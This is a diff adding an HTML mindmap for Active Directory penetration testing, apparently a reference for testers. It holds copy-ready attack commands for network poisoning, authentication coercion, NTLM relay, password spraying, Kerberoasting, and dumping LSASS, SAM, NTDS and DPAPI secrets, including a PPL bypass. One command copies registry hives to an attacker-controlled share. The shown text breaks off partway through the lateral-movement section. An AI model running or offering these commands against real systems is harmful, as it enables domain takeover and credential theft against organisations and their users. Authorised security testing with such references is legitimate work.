@@ -1,0 +1,2046 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>AD Pentesting Mindmap</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{width:100%;height:100%;overflow:hidden;background:#000;color:#e0e0e0;font-family:'Segoe UI',sans-serif;font-size:13px}
+#toolbar{position:fixed;top:0;left:0;right:0;height:44px;background:#111;border-bottom:1px solid #333;z-index:9999;display:flex;align-items:center;gap:8px;padding:0 12px}
+#toolbar input[type=text]{background:#1e1e1e;border:1px solid #444;color:#e0e0e0;padding:4px 8px;border-radius:4px;font-size:12px}
+#tip-ip,#tip-port,#tip-dom{width:130px}
+#srch{width:160px}
+#toolbar label{color:#888;font-size:11px}
+#toolbar button{background:#1e1e1e;border:1px solid #444;color:#ccc;padding:4px 10px;border-radius:4px;cursor:pointer;font-size:11px}
+#toolbar button:hover{background:#2a2a2a}
+#cv{position:fixed;top:44px;left:0;right:0;bottom:0;overflow:hidden;cursor:grab}
+#cv.panning{cursor:grabbing}
+#wd{position:absolute;transform-origin:0 0}
+svg#lines{position:absolute;top:0;left:0;pointer-events:none;z-index:0;overflow:visible}
+#root-node{position:absolute;left:20px;top:20px;background:#1b1b1b;border:1px solid #444;border-radius:6px;padding:12px 16px;z-index:2000;min-width:200px;max-height:calc(100vh - 120px);overflow-y:auto}
+#root-node h3{font-size:12px;color:#888;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;border-bottom:1px solid #333;padding-bottom:6px}
+#root-node .rl{display:flex;align-items:center;gap:7px;padding:3px 5px;cursor:pointer;font-size:12px;color:#bbb;border-radius:3px}
+#root-node .rl:hover{background:#252525;color:#fff}
+#root-node .dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.nd{position:absolute;border-radius:5px;border:1px solid #333;border-left-width:4px;background:#1e1e1e;min-width:230px;max-width:360px;z-index:1;box-shadow:0 4px 16px rgba(0,0,0,0.5)}
+.nd.front{z-index:100}
+.nh{background:#181818;border-bottom:1px solid #2a2a2a;padding:7px 10px;cursor:move;display:flex;align-items:center;justify-content:space-between;border-radius:4px 4px 0 0;user-select:none}
+.nh span{font-weight:600;font-size:12px;letter-spacing:.4px}
+.nh button{background:none;border:none;color:#666;cursor:pointer;font-size:14px;padding:0 3px;line-height:1}
+.nh button:hover{color:#ccc}
+.nb{padding:4px 0 6px}
+.nd.col .nb{display:none}
+.it{position:relative;padding:3px 8px 3px 18px;cursor:pointer;border-left:1px solid #2a2a2a;margin-left:8px;display:flex;align-items:center;justify-content:space-between;gap:5px;font-size:11.5px;line-height:1.4;min-height:24px}
+.it:hover{background:#252525}
+.it.sub-hd{color:#aaa;font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.4px;border-left:2px solid #333;padding-left:8px;margin-top:2px;background:#191919}
+.it.sub-hd:hover{background:#222}
+.it.note{color:#666;font-style:italic;cursor:default;font-size:11px}
+.it .lbl{flex:1;word-break:break-word;overflow:hidden}
+.it .cp{display:none;background:#1b3a2b;border:1px solid #2d5a3d;color:#6adfb0;padding:1px 5px;border-radius:3px;font-size:10px;cursor:pointer;white-space:nowrap;flex-shrink:0}
+.it:hover .cp{display:block}
+.it .cp:hover{background:#2d5a3d}
+.cmd-box{display:none;background:#0d1f0d;border:1px solid #1e3a1e;border-radius:4px;margin:3px 6px 4px 6px;padding:5px 8px;font-family:monospace;font-size:11px;color:#6adfb0;word-break:break-all;white-space:pre-wrap;line-height:1.5;user-select:text}
+.it.show-cmd+.cmd-box{display:block}
+.it .tog{color:#555;font-size:10px;flex-shrink:0;min-width:10px}
+.it.has-sub>.tog{color:#777}
+.si{display:none;background:#171717;border-left:2px solid #252525;margin-left:8px}
+.it.op+.si,.it.op~.si{display:block}
+.si .it{font-size:11px;padding-left:16px}
+.badge{display:inline-block;padding:1px 5px;border-radius:8px;font-size:9px;font-weight:700;margin-left:3px;flex-shrink:0;background:rgba(100,220,180,0.15);color:#6adfb0}
+.dim{opacity:.15}
+.hl .nh{outline:2px solid #5af}
+</style>
+</head>
+<body>
+<div id="toolbar">
+  <label>DC IP:</label><input id="tip-ip" type="text" placeholder="10.10.10.10" value="DC_IP">
+  <label>Port:</label><input id="tip-port" type="text" placeholder="445" value="PORT" style="width:55px">
+  <label>Domain:</label><input id="tip-dom" type="text" placeholder="domain.local" value="domain.local">
+  <label>Search:</label><input id="srch" type="text" placeholder="Search nodes...">
+  <button onclick="resetZoom()">⟳ Reset</button>
+  <button onclick="expandAll()">+ All</button>
+  <button onclick="collapseAll()">− All</button>
+  <span style="color:#555;font-size:10px;margin-left:6px">Left-drag to pan · Scroll to zoom · Drag node header to move · Click section to expand</span>
+</div>
+<div id="cv">
+  <div id="wd">
+    <svg id="lines"></svg>
+    <div id="root-node"><h3>AD Pentesting</h3></div>
+  </div>
+</div>
+<script>
+const h=(l,items)=>({label:l,items});
+const t=(l,items)=>({label:l,sub:items});
+const c=(l,cmd)=>({label:l,cmd});
+const cc=(cmd)=>({cmd});
+const nt=(l)=>({label:l,note:true});
+
+const DATA=[
+{id:'recon',label:'1. Scan & Initial Recon',color:'#4fc3f7',x:300,y:60,parent:null,items:[
+  h('Network Scanning',[
+    c('CME SMB scan','cme smb DC_IP/24'),
+    c('nmap ping scan','nmap -sP -p DC_IP/24'),
+    c('nmap quick top50','nmap -PN -sV --top-ports 50 --open DC_IP/24'),
+    c('nmap full scan','nmap -PN -sC -sV -p- -oA output DC_IP'),
+    c('nmap UDP scan','nmap -sU -sC -sV -oA output DC_IP'),
+    c('nmap SMB vuln','nmap -PN --script smb-vuln* -p139,445 DC_IP'),
+    c('nmap LDAP enum','nmap -n -sV --script "ldap* and not brute" -p 389 DC_IP'),
+  ]),
+  h('Find DC IP',[
+    c('nmcli show domain','nmcli dev show eth0'),
+    c('nslookup SRV','nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local'),
+    c('zone transfer','dig axfr domain.local @DC_IP'),
+    c('dnstool.py enum',"dnstool.py -u 'domain.local\\user' -p 'pass' --record '*' --action query DC_IP"),
+  ]),
+  h('SMB Guest / Null Session',[
+    c('enum4linux null','enum4linux -a -u "" -p "" DC_IP'),
+    c('enum4linux guest','enum4linux -a -u "guest" -p "" DC_IP'),
+    c('smbmap null','smbmap -u "" -p "" -P 445 -H DC_IP'),
+    c('smbclient null',"smbclient -U '%' -L //DC_IP"),
+    c('CME null session',"cme smb DC_IP -u \' -p \'"),
+    c('CME anonymous',"cme smb DC_IP -u 'a' -p \'"),
+  ]),
+  h('LDAP Enumeration (no creds)',[
+    c('ldapsearch base','ldapsearch -x -h DC_IP -s base'),
+    c('ldapsearch all users','ldapsearch -x -h DC_IP -b "DC=domain,DC=local" "(objectClass=user)"'),
+    c('nmap ldap scripts','nmap -n -sV --script "ldap* and not brute" -p 389 DC_IP'),
+  ]),
+  h('User Enumeration (no creds)',[
+    c('enum4linux users',"enum4linux -U DC_IP | grep 'user:'"),
+    c('CME users','cme smb DC_IP --users'),
+    c('net rpc users',"net rpc group members 'Domain Users' -W 'domain.local' -I 'DC_IP' -U '%'"),
+    c('kerbrute userenum','kerbrute userenum --dc DC_IP -d domain.local users.txt'),
+    c('nmap krb5 users','nmap -p 88 --script=krb5-enum-users --script-args "krb5-enum-users.realm=\'domain.local\',userdb=users.txt" DC_IP'),
+  ]),
+  h('Enumerate ADCS (find CA)',[
+    c('certipy find','certipy find -u user@domain.local -p pass -dc-ip DC_IP'),
+    c('CME adcs module','cme ldap DC_IP -u user -p pass -M adcs'),
+    c('certutil TCAInfo','certutil -TCAInfo'),
+    c('certutil templates','certutil -v -dsTemplate'),
+    c('certify find vuln','certify.exe find /vulnerable'),
+  ]),
+  h('Enumerate Azure AD Connect',[
+    c('Find MSOL desc','cme ldap DC_IP -u user -p pass -M get-desc-users | grep -i MSOL'),
+    nt('MSOL account has DCSync rights by default on Azure AD Connect servers'),
+  ]),
+]},
+
+{id:'enum',label:'2. Credentialed AD Enum',color:'#81c784',x:760,y:40,parent:null,items:[
+  h('BloodHound Collection',[
+    c('bloodhound-python','bloodhound-python -d domain.local -u user -p pass -gc DC_IP -c all'),
+    c('RustHound',"./rusthound -d domain.local -u 'user@domain.local' -p 'pass' -o output -z"),
+    c('SharpHound PS (all)','invoke-bloodhound -collectionmethod all -domain domain.local'),
+    c('SharpHound exe','sharphound.exe -c all -d domain.local'),
+    c('SharpHound avoid ATA','Invoke-BloodHound -CollectionMethod All -ExcludeDC'),
+    nt('Import JSON to BloodHound GUI: neo4j browser → use provided queries'),
+  ]),
+  h('PowerView – Users',[
+    c('All users','Get-DomainUser | select samaccountname,description,memberof'),
+    c('Admin users','Get-DomainUser -AdminCount | select samaccountname'),
+    c('Kerberoastable','Get-DomainUser -SPN -Properties SamAccountName,ServicePrincipalName'),
+    c('ASREPRoastable','Get-DomainUser -PreauthNotRequired -Properties SamAccountName'),
+    c('User descriptions','Get-DomainUser | select samaccountname,description | where {$_.description -ne $null}'),
+  ]),
+  h('PowerView – Computers',[
+    c('All computers','Get-DomainComputer | select name,logoncount,description,operatingsystem'),
+    c('Servers only',"Get-DomainComputer -OperatingSystem '*Server*'"),
+    c('Pingable','Get-DomainComputer -Ping | select name'),
+    c('Unconstrained deleg','Get-DomainComputer -Unconstrained -Properties DnsHostName'),
+    c('TrustedToAuth comps','Get-DomainComputer -TrustedToAuth -Properties DnsHostName,MSDS-AllowedToDelegateTo'),
+  ]),
+  h('PowerView – Groups',[
+    c('All groups','Get-DomainGroup | select Name'),
+    c('Admin groups','Get-DomainGroup *admin* | select name,Description'),
+    c('DA members','Get-DomainGroupMember -Identity "Domain Admins" | select MemberName,MemberObjectClass'),
+    c('Local groups','Get-NetLocalGroup -ComputerName TARGET'),
+    c('Local group members','Get-NetLocalGroupMember -ComputerName TARGET -GroupName Administrators | select MemberName,IsGroup,IsDomain'),
+  ]),
+  h('PowerView – GPO & OU',[
+    c('All GPOs','Get-DomainGPO | select displayname,name'),
+    c('Computer GPOs','Get-DomainGPO -ComputerIdentity TARGET | select displayname'),
+    c('All OUs','Get-DomainOU | select name,gplink'),
+    c('Computers in OU','(Get-DomainOU -Identity OU).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name'),
+    c('GPO local group map','Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity TARGET'),
+    c('User GPO map','Get-DomainGPOUserLocalGroupMapping -Identity USER'),
+  ]),
+  h('PowerView – ACLs',[
+    c('ACL for user','Get-DomainObjectAcl -SamAccountName USER -ResolveGUIDs'),
+    c('ACL for DA group','Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain Admins,CN=Users,DC=domain,DC=local" -ResolveGUIDs | select ObjectDN,AceType,ActiveDirectoryRights'),
+    c('Interesting ACLs','Find-InterestingDomainAcl -ResolveGUIDs | select IdentityReferenceName,AceType,ActiveDirectoryRights -Unique'),
+    c('Path ACL','Get-PathAcl -Path "\\\\TARGET.domain.local\\sysvol"'),
+  ]),
+  h('PowerView – Session & Logon',[
+    c('Net logged on','Get-NetLoggedon | select username'),
+    c('Logged on local','Get-LoggedonLocal -ComputerName TARGET'),
+    c('Last logged on','Get-LastLoggedOn -ComputerName TARGET'),
+  ]),
+  h('PowerView – Forest',[
+    c('Current forest','Get-Forest | select Name,SchemaRoleOwner,RootDomainSid'),
+    c('Forest domains','Get-ForestDomain | select Name,PdcRoleOwner'),
+    c('Forest GCs','Get-ForestGlobalCatalog | select Forest,Domain,IPAddress,Name'),
+    c('Forest trusts','Get-ForestTrust'),
+    c('External trusts','Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}'),
+  ]),
+  h('AD Module (RSAT)',[
+    c('All users','Get-ADUser -Filter * -Properties *'),
+    c('All computers','Get-ADComputer -Filter * -Properties *'),
+    c('All groups','Get-ADGroup -Filter * | select Name'),
+    c('DA members','Get-ADGroupMember "Domain Admins"'),
+    c('Password policy','Get-ADDefaultDomainPasswordPolicy'),
+    c('FGPP','Get-ADFineGrainedPasswordPolicy -filter *'),
+    c('User FGPP result','Get-ADUserResultantPasswordPolicy -Identity USER'),
+  ]),
+  h('ldeep / NetExec',[
+    c('ldeep all backup','ldeep ldap -u user -p pass -d domain.local -s ldap://DC_IP all backup/'),
+    c('ldeep users','ldeep ldap -u user -p pass -d domain.local -s ldap://DC_IP users'),
+    c('ldeep trusts','ldeep ldap -u user -p pass -d domain.local -s ldap://DC_IP trusts'),
+    c('ldeep delegations','ldeep ldap -u user -p pass -d domain.local -s ldap://DC_IP delegations'),
+    c('CME shares','cme smb DC_IP -u user -p pass --shares'),
+    c('CME users','cme smb DC_IP -u user -p pass --users'),
+    c('CME groups','cme smb DC_IP -u user -p pass --groups'),
+    c('CME pass-pol','cme smb DC_IP -u user -p pass --pass-pol'),
+    c('CME LDAP desc','cme ldap DC_IP -u user -p pass -M get-desc-users'),
+  ]),
+  h('Impacket Enum',[
+    c('GetADUsers all','GetADUsers.py -all -dc-ip DC_IP domain.local/user:pass'),
+    c('GetUserSPNs','GetUserSPNs.py -request -dc-ip DC_IP domain.local/user:pass'),
+    c('rpcdump check RPRN','rpcdump.py domain.local/user:pass@DC_IP | grep MS-RPRN'),
+  ]),
+]},
+
+{id:'poison',label:'3. LLMNR/NBT-NS Poisoning',color:'#ff8a65',x:300,y:460,parent:null,items:[
+  h('Responder',[
+    c('Responder basic','responder -I eth0'),
+    c('Responder LM downgrade','responder -I eth0 --lm'),
+    c('Responder no SMB/HTTP','responder -I eth0 -v -P'),
+    nt('Disable SMB+HTTP in Responder.conf when relaying (not capturing)'),
+    nt('Captures NetNTLMv1/v2 hashes from any machine that sends broadcast auth'),
+  ]),
+  h('IPv6 Poisoning (mitm6)',[
+    c('mitm6','mitm6 -d domain.local'),
+    c('ntlmrelayx with mitm6','ntlmrelayx.py -wh DC_IP -t ldap://DC_IP -l /tmp -6 -debug'),
+    nt('IPv6 preferred over IPv4 by Windows → DNS queries go to attacker → NTLM auth captured'),
+  ]),
+  h('ARP Poisoning',[
+    c('bettercap start','bettercap'),
+    c('bettercap arp spoof','set arp.spoof.targets TARGET_IP; arp.spoof on'),
+    c('bettercap net probe','net.probe on'),
+  ]),
+  h('Coercion Techniques',[
+    c('PetitPotam (unauth) CVE-2022-26925','PetitPotam.py -d domain.local <listener_ip> DC_IP'),
+    c('PetitPotam (auth)','PetitPotam.py -d domain.local -u user -p pass <listener_ip> DC_IP'),
+    c('PrinterBug','printerbug.py domain.local/user:pass@DC_IP <listener_ip>'),
+    c('Coercer (all methods)','coercer.py -u user -d domain.local -p pass -t DC_IP -l <attacker_ip>'),
+    c('rpcdump check RPRN','rpcdump.py domain.local/user:pass@DC_IP | grep MS-RPRN'),
+    c('WebDAV drop .url','cme smb DC_IP -u user -p pass -M drop-sc'),
+    c('Find WebDAV','cme smb DC_IP -u user -p pass -M webdav'),
+    c('Add DNS record (WebDAV coerce)',"dnstool.py -u 'domain.local\\user' -p 'pass' --record 'attacker' --action add --data <attacker_ip> DC_IP"),
+    c('coerce via HTTP with WebDAV','# coerce with attacker_hostname@80/path as target after WebDAV setup'),
+  ]),
+]},
+
+{id:'ntlmrelay',label:'4. NTLM Relay Attacks',color:'#ce93d8',x:760,y:420,parent:null,items:[
+  h('Find Relay Targets',[
+    c('Find unsigned SMB','nmap -Pn -sS -T4 --open --script smb-security-mode -p445 DC_IP/24'),
+    c('CME gen relay list','cme smb DC_IP/24 --gen-relay-list relay.txt'),
+    nt('Relay works when SMB signing not required (default on workstations, NOT on DCs)'),
+  ]),
+  h('SMB → SMB Relay',[
+    c('Basic relay with enum','ntlmrelayx.py -tf targets.txt -smb2support --enum-domain'),
+    c('SOCKS relay (best)','ntlmrelayx.py -tf targets.txt -smb2support -socks'),
+    c('Relay IPv6 too','ntlmrelayx.py -tf targets.txt -smb2support -socks -6'),
+    c('MS08-068 (Win2k/2008)','use exploit/windows/smb/smb_relay'),
+    nt('After SOCKS: proxychains + impacket tools (secretsdump, smbexec, wmiexec...)'),
+  ]),
+  h('SMB → LDAP(S) Relay',[
+    c('Escalate user priv','ntlmrelayx.py --remove-mic --escalate-user myuser -t ldap://DC_IP -smb2support'),
+    c('Add computer + RBCD','ntlmrelayx.py -t ldaps://DC_IP --remove-mic --add-computer COMP$ COMPPASS --delegate-access -smb2support'),
+    c('Shadow credentials relay',"ntlmrelayx -t ldap://DC_IP --shadow-credentials --shadow-target 'DC$'"),
+    nt('NetNTLMv1: relay to LDAP directly. NetNTLMv2: must remove MIC (CVE-2019-1040)'),
+  ]),
+  h('SMB → ADCS Web Enrollment (ESC8)',[
+    c('ntlmrelayx ADCS','ntlmrelayx.py -t http://DC_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController'),
+    c('certipy relay','certipy relay -ca DC_IP -template DomainController'),
+    nt('Coerce DC auth via PetitPotam → relay to ADCS CA → get DC cert → DCSync'),
+  ]),
+  h('SMB → Netlogon (Zerologon safe method)',[
+    c('DC→DC relay DCSync','ntlmrelayx.py -t dcsync://DC2_IP -smb2support -auth-smb user:pass'),
+    nt('Coerce DC01 to authenticate, relay to DC02 Netlogon → DCSync rights'),
+  ]),
+  h('SMB → MSSQL',[
+    c('Relay to MSSQL SOCKS','ntlmrelayx.py -t mssql://DC_IP -smb2support -socks'),
+  ]),
+  h('HTTP → LDAP (mitm6)',[
+    c('mitm6 + ntlmrelayx','ntlmrelayx.py -wh <attacker_ip> -t ldap://DC_IP -l /tmp -6 -debug'),
+  ]),
+  h('Relay via SOCKS (proxychains)',[
+    c('secretsdump','proxychains secretsdump -no-pass domain.local/user@DC_IP'),
+    c('smbexec','proxychains smbexec.py -no-pass domain.local/user@DC_IP'),
+    c('atexec','proxychains atexec.py -no-pass domain.local/user@DC_IP "whoami"'),
+    c('smbclient','proxychains smbclient.py -no-pass user@DC_IP'),
+    c('mssqlclient','proxychains mssqlclient.py -windows-auth domain.local/user@DC_IP -no-pass'),
+    c('lookupsid','proxychains lookupsid.py domain.local/user@DC_IP -no-pass -domain-sids'),
+  ]),
+  h('PrivExchange (CVE-2019-0686)',[
+    c('privexchange.py','python privexchange.py -ah <attacker_host> <exchange_host> -u user -d domain.local -p pass'),
+    c('Coerce HTTP →','# Exchange coerces HTTP auth → relay to LDAP → escalate to DA'),
+  ]),
+  h('WSUS Relay',[
+    c('pywsus','pywsus.py'),
+    c('WSUSpendu','WSUSpendu.ps1'),
+    nt('Compromised WSUS server → relay to deploy malicious update → SYSTEM on all clients'),
+  ]),
+]},
+
+{id:'passattacks',label:'5. Password Attacks',color:'#ffb74d',x:1220,y:40,parent:null,items:[
+  h('Password Spraying',[
+    c('Get password policy first','cme smb DC_IP -u user -p pass --pass-pol'),
+    c('CME spray','cme smb DC_IP -u users.txt -p Password1 --continue-on-success'),
+    c('CME user=pass test','cme smb DC_IP -u users.txt -p users.txt --no-bruteforce'),
+    c('CME multiple passwords','cme smb DC_IP -u users.txt -p passwords.txt'),
+    c('sprayhound','sprayhound -U users.txt -d domain.local -dc DC_IP'),
+    c('kerbrute spray','kerbrute passwordspray -d domain.local --dc DC_IP users.txt Password1'),
+    c('Get-ADDefaultPolicy','Get-ADDefaultDomainPasswordPolicy'),
+    c('FGPP check','Get-ADFineGrainedPasswordPolicy -filter *'),
+    nt('ALWAYS check lockout policy before spraying! Threshold and observation window critical'),
+  ]),
+  h('ASREPRoasting',[
+    c('GetNPUsers (no creds)','GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt'),
+    c('GetNPUsers (with creds)','GetNPUsers.py -request -dc-ip DC_IP domain.local/user:pass'),
+    c('Rubeus asreproast','Rubeus.exe asreproast /format:hashcat'),
+    c('CME ASREP','cme ldap DC_IP -u user -p pass --asreproast hashes.txt'),
+    c('BH query','MATCH (u:User {dontreqpreauth:true}) RETURN u'),
+    c('PowerView ASREP users','Get-DomainUser -PreauthNotRequired -Properties SamAccountName'),
+    c('hashcat crack','hashcat -m 18200 -a 0 hashes.txt rockyou.txt'),
+    c('john crack','john --format=krb5asrep --wordlist=rockyou.txt hashes.txt'),
+  ]),
+  h('Kerberoasting',[
+    c('GetUserSPNs','GetUserSPNs.py -request -dc-ip DC_IP domain.local/user:pass'),
+    c('Rubeus kerberoast','Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt'),
+    c('CME kerberoast','cme ldap DC_IP -u user -p pass --kerberoasting hashes.txt'),
+    c('Invoke-Kerberoast','Invoke-Kerberoast -OutputFormat Hashcat | % { $_.Hash } > hashes.txt'),
+    c('Request-SPNTicket','Request-SPNTicket -SPN "<SPN>" -OutputFormat Hashcat | % { $_.Hash } > hashes.txt'),
+    c('Get-DomainSPNTicket all','Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat > hashes.txt'),
+    c('From memory → disk','mimikatz "kerberos::list /export"'),
+    c('PowerView SPN users','Get-DomainUser -SPN -Properties SamAccountName,ServicePrincipalName'),
+    c('BH query','MATCH (u:User {hasspn:true}) RETURN u'),
+    c('BH to DA path','MATCH (u:User {hasspn:true}),(c:Computer),p=shortestPath((u)-[*1..]->(c)) RETURN p'),
+    c('hashcat TGS RC4','hashcat -m 13100 -a 0 spn.txt rockyou.txt'),
+    c('hashcat TGS AES128','hashcat -m 19600 -a 0 spn.txt rockyou.txt'),
+    c('hashcat TGS AES256','hashcat -m 19700 -a 0 spn.txt rockyou.txt'),
+    c('john TGS','john spn.txt --format=krb5tgs --wordlist=rockyou.txt'),
+  ]),
+  h('Targeted Kerberoasting (add SPN)',[
+    c('Set SPN on user',"Set-DomainObject -Identity USER -Set @{serviceprincipalname='svc/fake'}"),
+    c('targetedKerberoast.py','targetedKerberoast.py -d domain.local -u user -p pass'),
+    nt('Requires GenericWrite/GenericAll on target user; adds SPN → makes kerberoastable'),
+  ]),
+  h('Blind Kerberoasting (no creds)',[
+    c('Rubeus blind kerberoast','Rubeus.exe kerberoast /domain:domain.local /dc:DC_IP /nopreauth:asrep_user /spns:users.txt'),
+    c('impacket blind','GetUserSPNs.py -no-preauth "asrep_user" -usersfile "users.txt" -dc-host "DC_IP" "domain.local"/'),
+    c('CVE-2022-33679','python3 CVE-2022-33679.py domain.local/user DC_IP'),
+    nt('Use ASREP user to request TGS for other users without having a password'),
+  ]),
+  h('Hash Cracking Reference',[
+    c('LM hashcat','hashcat -m 3000 -a 3 hash.txt'),
+    c('LM john','john --format=lm hash.txt'),
+    c('NTLM hashcat','hashcat -m 1000 -a 3 hash.txt'),
+    c('NTLM john','john --format=nt hash.txt'),
+    c('NetNTLMv1 hashcat','hashcat -m 5500 -a 3 hash.txt'),
+    c('NetNTLMv1 john','john --format=netntlm hash.txt'),
+    c('NetNTLMv1 crack.sh','# Submit to https://crack.sh/ for free GPU cracking'),
+    c('NetNTLMv2 hashcat','hashcat -m 5600 -a 0 hash.txt rockyou.txt'),
+    c('NetNTLMv2 john','john --format=netntlmv2 hash.txt'),
+    c('MsCache2 hashcat (slow)','hashcat -m 2100 -a 0 mscache-hash rockyou.txt'),
+    c('Kerberos ASREP hashcat','hashcat -m 18200 -a 0 AS-REP_hashes rockyou.txt'),
+    c('Kerberos TGS RC4','hashcat -m 13100 -a 0 spn.txt rockyou.txt'),
+  ]),
+]},
+
+{id:'creds',label:'6. Credential Extraction',color:'#f06292',x:1220,y:440,parent:null,items:[
+  h('LSASS Dump',[
+    c('procdump','procdump.exe -accepteula -ma lsass.exe lsass.dmp'),
+    c('mimikatz logonpasswords','mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"'),
+    c('mimikatz from dump','mimikatz "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"'),
+    c('lsassy remote','lsassy -d domain.local -u user -p pass DC_IP'),
+    c('CME lsassy','cme smb DC_IP/24 -u user -p pass -M lsassy'),
+    c('PPLdump (bypass PPL)','PPLdump64.exe lsass.exe lsass.dmp'),
+    c('mimikatz PPL mimidriver','mimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "!-"'),
+    c('MSF meterpreter','load kiwi; creds_all'),
+  ]),
+  h('SAM Database',[
+    c('CME SAM remote',"cme smb DC_IP/24 -u user -p pass --sam"),
+    c('reg save','reg save HKLM\\SAM sam.bak; reg save HKLM\\SECURITY sec.bak; reg save HKLM\\SYSTEM sys.bak'),
+    c('secretsdump SAM LOCAL','secretsdump.py -system SYSTEM -sam SAM LOCAL'),
+    c('secretsdump remote','secretsdump.py domain.local/user:pass@DC_IP'),
+    c('mimikatz lsadump sam','mimikatz "privilege::debug" "lsadump::sam" "exit"'),
+    c('shadow copies trick','diskshadow list shadows all'),
+    c('mklink shadow copy','mklink /d c:\\shadowcopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\'),
+    c('reg.py backup','reg.py domain.local/user:pass@DC_IP backup -o \\\\attacker\\share'),
+  ]),
+  h('LSA Secrets',[
+    c('CME LSA',"cme smb DC_IP/24 -u user -p pass --lsa"),
+    c('secretsdump remote','secretsdump.py domain.local/user:pass@DC_IP'),
+    c('secretsdump LOCAL','secretsdump.py -security SECURITY -system SYSTEM LOCAL'),
+    nt('Contains: cached domain logon (MsCache2), machine account, service account creds'),
+  ]),
+  h('NTDS.dit (Domain Controller)',[
+    c('CME ntds dump','cme smb DC_IP -u user -p pass -d domain.local --ntds'),
+    c('secretsdump DC','secretsdump.py domain.local/user:pass@DC_IP'),
+    c('secretsdump just NTLM',"secretsdump.py 'domain.local'/'user':'pass'@'DC_IP' -just-dc-ntlm"),
+    c('ntdsutil IFM','ntdsutil "ac i ntds" "ifm" "create full c:\\temp" q q'),
+    c('secretsdump from IFM','secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-extract'),
+    c('certsync','certsync -u user -p pass -d domain.local -dc-ip DC_IP -ns DC_IP'),
+    c('MSF domain hashdump','use windows/gather/credentials/domain_hashdump'),
+  ]),
+  h('DPAPI Secrets',[
+    c('dpapi backup keys','dpapi.py backupkeys -hashes :NTHASH -t Administrator@DC_IP --export'),
+    c('DonPAPI all','DonPAPI domain.local/user:pass@DC_IP/24'),
+    c('DonPAPI with pvk','DonPAPI -pvk domain_backupkey.pvk domain.local/user@DC_IP/24'),
+    c('mimikatz dpapi','mimikatz "sekurlsa::dpapi" "exit"'),
+    c('secretsdump dpapi','secretsdump.py domain.local/user:pass@DC_IP'),
+  ]),
+  h('Certificate-Based Extraction',[
+    c('masky','masky -d domain.local -u user -p pass -ca CA_NAME DC_IP'),
+    nt('masky: gets NT hash, ccache, pfx from each active session via ADCS'),
+    c('certipy shadow auto',"certipy shadow auto -u user@domain.local -p pass -account TARGET"),
+    c('certipy auth from pfx','certipy auth -pfx TARGET.pfx -dc-ip DC_IP'),
+  ]),
+  h('Search for Cleartext Passwords',[
+    c('findstr passwords',"findstr /si 'password' *.txt *.xml *.docx"),
+    c('findstr passwords recursive',"findstr /S /I cpassword \\\\domain.local\\sysvol\\domain.local\\policies\\*.xml"),
+    c('lazagne all','lazagne.exe all'),
+    c('Chrome creds path','%appdata%\\Local\\Google\\Chrome\\User Data\\Default'),
+    c('SharpChromium','SharpChromium.exe'),
+  ]),
+  h('Token Manipulation',[
+    c('incognito list tokens','.\\incognito.exe list_tokens -u'),
+    c('incognito execute','.\\incognito.exe execute -c "domain.local\\admin" powershell.exe'),
+    c('MSF impersonate token','use incognito; impersonate_token "domain.local\\\\admin"'),
+    c('CME impersonate','cme smb DC_IP -u user -p pass -M impersonate'),
+    c('IRS list sessions','irs.exe list'),
+    c('IRS exec as pid','irs.exe exec --pid <pid> --command cmd.exe'),
+  ]),
+  h('Azure AD Connect (MSOL)',[
+    c('Find MSOL account','cme ldap DC_IP -u user -p pass -M get-desc-users | grep -i MSOL'),
+    c('Dump MSOL cleartext','azuread_decrypt_msol_v2.ps1'),
+    c('CME msol module','cme smb DC_IP -u user -p pass -M msol'),
+    nt('MSOL_ account has DCSync rights → full domain compromise if compromised'),
+    c('DCSync after MSOL',"secretsdump.py 'domain.local'/'user':'pass'@'DC_IP'"),
+  ]),
+]},
+
+{id:'lateral',label:'7. Lateral Movement',color:'#4db6ac',x:1680,y:40,parent:null,items:[
+  h('Pass the Hash (PTH)',[
+    t('PsExec-style (SYSTEM shell)',[
+      c('psexec.py PTH','psexec.py -hashes :NTHASH user@DC_IP'),
+      c('mimikatz pth','mimikatz "privilege::debug sekurlsa::pth /user:user /domain:domain.local /ntlm:NTHASH"'),
+      c('CME PTH all range',"cme smb DC_IP/24 -u user -d domain.local -H ':NTHASH'"),
+      c('CME local-auth PTH',"cme smb DC_IP/24 -u user -H ':NTHASH' --local-auth"),
+    ]),
+    t('Semi-interactive (file R/W)',[
+      c('smbexec.py','smbexec.py -hashes :NTHASH user@DC_IP'),
+      c('wmiexec.py','wmiexec.py -hashes :NTHASH user@DC_IP'),
+      c('atexec.py','atexec.py -hashes :NTHASH user@DC_IP "whoami"'),
+      c('dcomexec.py','dcomexec.py -hashes :NTHASH user@DC_IP'),
+    ]),
+    t('WinRM / RDP',[
+      c('evil-winrm PTH','evil-winrm -i DC_IP -u user -H NTHASH'),
+      c('RDP DisableRestrictedAdmin',"reg.py domain.local/user@DC_IP -hashes ':NTHASH' add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'"),
+      c('xfreerdp PTH','xfreerdp /u:user /d:domain.local /pth:NTHASH /v:DC_IP'),
+    ]),
+    t('SMB / MSSQL',[
+      c('smbclient.py PTH','smbclient.py -hashes :NTHASH user@DC_IP'),
